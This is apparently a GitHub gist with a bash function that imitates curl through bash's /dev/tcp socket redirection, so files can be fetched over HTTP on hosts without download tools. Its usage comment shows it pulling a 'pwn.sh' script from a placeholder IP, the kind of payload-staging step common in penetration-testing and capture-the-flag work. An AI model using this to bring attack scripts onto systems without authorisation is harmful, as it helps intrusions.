#date: 2023-04-03T16:59:26Z
#url: https://api.github.com/gists/6059085c98c0c5869dbebeafe08b240d
#owner: https://api.github.com/users/lemmyz4n3771

function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
 
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
 
# USAGE: __curl http://<IP>/pwn.sh > pwn.sh